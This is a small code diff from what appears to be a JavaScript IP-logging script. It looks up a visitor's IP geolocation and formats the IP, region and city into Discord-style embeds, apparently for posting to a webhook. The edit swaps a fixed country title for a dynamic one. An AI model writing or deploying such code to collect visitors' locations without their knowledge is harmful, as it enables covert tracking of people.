@@ -6,7 +6,7 @@ fetch('https://api.2ip.ua/geo.json?ip', { method: "GET" }).then(res => res.json(
 		},
 		body: JSON.stringify({ embeds: [
 		    {
-		      title: "Украина",
+		      title: geo.country,
 		      description: `**ip**: ${geo.ip}\n`+
 		      `**Область**: ${geo.region_rus}\n`+
 		      `**Город**: ${geo.city_rus}\n`+
